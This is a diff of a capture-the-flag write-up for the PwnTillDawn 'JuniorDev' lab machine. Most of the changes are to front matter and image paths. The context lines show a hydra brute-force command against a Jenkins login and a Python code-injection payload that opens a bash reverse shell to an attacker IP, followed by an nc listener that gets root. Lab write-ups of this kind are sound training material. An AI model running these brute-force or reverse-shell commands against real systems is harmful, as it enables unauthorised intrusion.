@@ -1,8 +1,7 @@
 ---
-layout: post
 title: JuniorDev
-subtitle: 10.150.150.38
-tags: [PwnTillDawn,Medium,Linux,Privilege Escalation,Brute Force HTTP,Jenkins,Python Reverse Shell]
+category: [writeups,PwnTillDawn]
+tags: [Linux,Privilege-Escalation,Brute-Force-HTTP,Jenkins,Python-Reverse-Shell]
 ---
 # JuniorDev
 - Difficulty : `Medium`
@@ -10,17 +9,11 @@ tags: [PwnTillDawn,Medium,Linux,Privilege Escalation,Brute Force HTTP,Jenkins,Py
 - Operating System : `Linux`
 
 # Table of Content
-- [Rustscan result](#rustscan-result)
 - [Nmap Result](#nmap-result)
 - [Method to solve the challenge](#method-to-solve-the-challenge)
 - [Privilege Escalation](#privilege-escalation)
-- [Flag](#flag)
 
-## Rustscan Result
-```
-Open 10.150.150.38:22
-Open 10.150.150.38:30609
-```
+
 ## Nmap Result
 ```
 Nmap scan report for 10.150.150.38
@@ -48,11 +41,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # Method to solve the challenge
 In this challenge, we will start of with website on port 30609 instead of the usual port.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180378699-76ba0c1c-a2d6-4f87-bba8-9682925831da.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-1.png)
 <br>
 Since it is a login form, we will always start with the basic which is SQL injection and default credentials. After trying both of these, it seems that the login form is not vulnearable to sql injection. As for default credentials, jenkins only provide username `admin` while the password is different for every user. The next method that i had in mind is bruteforcing with `hydra`. It is abit complicated to bruteforce with hydrs we will need to prepared some information.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180379763-2e8f0efa-b892-4e6b-aff4-0d644c4a0493.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-2.png)
 <br>
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
@@ -78,15 +71,15 @@ http-post-form = post request from information gathering in inspection.
 ```
 We managed to found a password which allow us to login into the website. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180382311-08414134-f528-4568-9082-cb7139aafafc.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-3.png)
 <br>
 After wondering around with the website, it looks like there is a function which execute command from shell. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180383089-7f99d385-1a5a-4e09-a730-7142e8642f48.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-4.png)
 <br>
 Since it is possible to execute command, we could make use of it and get a reverse shell.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180383838-65c84469-8427-487b-87f3-9d31fe9708ce.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-5.png)
 <br>
 After completing everything, build it and a reverse shell should spawn is everything is done correctly.
 ```
@@ -134,13 +127,15 @@ Open 10.150.150.38:30609
 ```
 After wondering around the website and gathering information, it appears that the python script is acting like a calculator that could add things up. 
 <br>
-![image](https://user-images.githubusercontent.com/88197307/180387554-483bcb09-7f17-4280-a31d-7250f0dae00f.png)
+![](../assets/img/posts/2022-07-22-JuniorDev-6.png)
 <br>
 After searching for some helps about exploiting python, I came across a useful [website](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1) which might help me to get another reverse shell. Since we do not have the source code, the only thing is we try and hope that it works.
 ```
 __import__('os').system('bash -c "bash -i >& /dev/tcp/10.66.67.2/1235 0>&1"')#
 ```
-![image](https://user-images.githubusercontent.com/88197307/180388177-1064cf74-4aee-41bb-ba22-eba266d94000.png)
+
+![](../assets/img/posts/2022-07-22-JuniorDev-7.png)
+
 ```
 nc -nvlp 1235
 listening on [any] 1235 ...
@@ -155,18 +150,6 @@ root@dev1:~/mycalc#
 
 It works and we managed to get our shell with root account.
 
-# Flag
-Flag 69: <br>
-![image](https://user-images.githubusercontent.com/88197307/180388984-6338f2ad-fbf3-4a27-a596-df2de2b1f20b.png)
-<br>
-Flag 70: <br>
-![image](https://user-images.githubusercontent.com/88197307/180389441-16b9f623-2a11-42bd-97b9-49d00f57e8c0.png)
-<br>
-Flag 71: <br>
-![image](https://user-images.githubusercontent.com/88197307/180388791-6c9c4474-354c-42ec-a9c2-7b8707e46d32.png)
-<br>
-Flag 72: <br>
-![image](https://user-images.githubusercontent.com/88197307/180388704-74db655e-6844-458c-a3aa-c8bfe8708078.png)
 
 
 
